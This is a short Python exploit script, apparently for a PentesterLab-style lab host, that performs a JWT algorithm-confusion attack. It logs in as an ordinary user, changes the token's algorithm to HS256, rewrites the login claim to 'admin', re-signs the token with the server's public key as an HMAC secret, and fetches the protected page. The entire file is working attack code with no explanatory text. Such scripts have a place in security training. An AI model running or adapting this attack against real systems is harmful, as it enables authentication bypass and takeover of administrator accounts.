import requests
import base64, json
import hmac,hashlib

indexurl = 'http://ptl-4b7f4acb-8b5a7855.libcurl.so/index.php'
loginurl = 'http://ptl-4b7f4acb-8b5a7855.libcurl.so/login.php'

data = {
	'username' : 'abcd',
	'password' : 'abcd12'
}

session = requests.Session()
r = session.post(loginurl, data=data)

token = session.cookies['auth']

header,payload,signature = token.split('.')
header += '='*(8 - (len(header)%8))
payload += '='*(8 - (len(payload)%8))

key = open('public.pem').read().encode('utf-8')

################## header #######################

header_d = json.loads(base64.urlsafe_b64decode(header).decode('utf-8'))

header_d['alg'] = 'HS256'

header = base64.urlsafe_b64encode(json.dumps(header_d).encode('utf-8')).decode('utf-8').rstrip('=')

############### payload #######################

payload_d = json.loads(base64.urlsafe_b64decode(payload).decode('utf-8'))

payload_d['login'] = 'admin'

payload = base64.urlsafe_b64encode(json.dumps(payload_d).encode('utf-8')).decode('utf-8').rstrip('=')

################## signature ##################

sign = (header+'.'+payload).encode('utf-8')
signature = base64.urlsafe_b64encode(hmac.new(key,sign,hashlib.sha256).digest()).decode('utf-8').rstrip('=')

token = header+'.'+payload+'.'+signature

session.cookies['auth'] = token

s = session.get(indexurl)
content = s.text

print(content)


